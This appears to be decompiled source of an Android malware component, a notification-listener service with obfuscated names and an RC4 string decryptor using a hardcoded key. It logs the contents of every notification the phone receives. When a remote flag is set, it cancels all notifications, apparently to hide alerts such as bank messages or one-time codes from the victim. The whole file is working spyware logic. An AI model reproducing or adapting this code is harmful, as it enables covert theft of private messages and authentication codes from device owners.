package com.example.mmm.Service;

import android.annotation.*;
import com.example.mmm.*;
import com.example.mmm.API.*;
import android.util.*;
import android.os.*;
import android.content.*;
import com.example.mmm.Utils.*;
import android.service.notification.*;

@TargetApi(18)
public class srvNotificationListener extends NotificationListenerService
{
    private static srvNotificationListener recipes$;
    constants noise$;
    utils juice$;
    
    public srvNotificationListener() {
        super();
        this.noise$ = new constants();
        this.juice$ = new utils();
    }
    
    private String decrypt_str(String s) {
        s = new String(new ClassRC4("wewiejvtlfqy".getBytes())._nevada(utils.hexStringToByteArray(new String(Base64.decode(s, 0), "UTF-8"))));
        return s;
    }
    
    public void onCreate() {
        super.onCreate();
        if (Build$VERSION.SDK_INT < 21) {
            srvNotificationListener.recipes$ = this;
        }
    }
    
    public void onDestroy() {
        if (Build$VERSION.SDK_INT < 24) {
            srvNotificationListener.recipes$ = null;
        }
        super.onDestroy();
    }
    
    public void onListenerConnected() {
        super.onListenerConnected();
        if (Build$VERSION.SDK_INT >= 21) {
            srvNotificationListener.recipes$ = this;
        }
    }
    
    public void onListenerDisconnected() {
        if (Build$VERSION.SDK_INT >= 24) {
            srvNotificationListener.recipes$ = null;
        }
        super.onListenerDisconnected();
    }
    
    public void onNotificationPosted(final StatusBarNotification statusBarNotification) {
        if (this.juice$.SettingsRead((Context)this, "AF").equals("1")) {
            this.cancelAllNotifications();
        }
        new LogNotification((Context)this).sendNotificationLog(new NotificationParser(statusBarNotification, true).toString());
    }
    
    public void onNotificationRemoved(final StatusBarNotification statusBarNotification) {
        if (this.juice$.SettingsRead((Context)this, "AF").equals("1")) {
            this.cancelAllNotifications();
        }
        new LogNotification((Context)this)._revenue(statusBarNotification);
    }
    
    public void onNotificationRemoved(final StatusBarNotification statusBarNotification, final NotificationListenerService$RankingMap notificationListenerService$RankingMap, final int n) {
        if (this.juice$.SettingsRead((Context)this, "AF").equals("1")) {
            this.cancelAllNotifications();
        }
        new LogNotification((Context)this)._revenue(statusBarNotification);
    }
}
